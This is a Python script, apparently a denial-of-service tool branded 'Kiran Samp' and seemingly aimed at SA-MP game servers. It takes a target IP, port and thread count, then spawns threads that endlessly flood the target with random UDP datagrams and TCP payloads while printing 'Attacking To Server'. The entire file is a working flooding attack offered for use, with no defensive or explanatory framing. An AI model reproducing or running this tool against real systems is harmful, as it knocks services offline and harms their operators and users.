import random
import socket
import threading
import time
import os,sys
import random, socket, threading
import os, socket, threading, colorsys, time, random
import socket
import sys
import os
import time
import random
import threading
import base64 as b64
from types import MethodType
import string
import json
import sys

if len(sys.argv)==1:
    sys.exit('Usage: python3 samp-vip.py <ip> <port> <times> <threads>')
ip = sys.argv[1]
port = int(sys.argv[2])
times = int(sys.argv[3])
threads = int(sys.argv[3])
os.system("clear")
print("""
\033[91m
░██████╗░█████╗░███╗░░░███╗██████╗░
██╔════╝██╔══██╗████╗░████║██╔══██╗
╚█████╗░███████║██╔████╔██║██████╔╝
░╚═══██╗██╔══██║██║╚██╔╝██║██╔═══╝░
██████╔╝██║░░██║██║░╚═╝░██║██║░░░░░
╚═════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░░░░

██╗░░░██╗██╗██████╗░
██║░░░██║██║██╔══██╗
╚██╗░██╔╝██║██████╔╝
░╚████╔╝░██║██╔═══╝░
░░╚██╔╝░░██║██║░░░░░
░░░╚═╝░░░╚═╝╚═╝░░░░░
Kiran Samp""")


def xxxx():
  data = random._urandom(9591)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m}=====> Attacking To  \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Kiran Exploit")

def xxx():
  data = random._urandom(9386)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m}=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Subscribe KiranSamp")

def xx():
  data = random._urandom(9047)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[91m}=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] Menyerang Server")

def x():
  data = random._urandom(9316)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[91m}=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] SUBSCRIBE KIRAN SAMP")

for y in range(threads):
    th = threading.Thread(target = xxxx)
    th.start()
    th = threading.Thread(target = xxx)
    th.start()
    th = threading.Thread(target = xx)
    th.start()
    th = threading.Thread(target = x)
    th.start()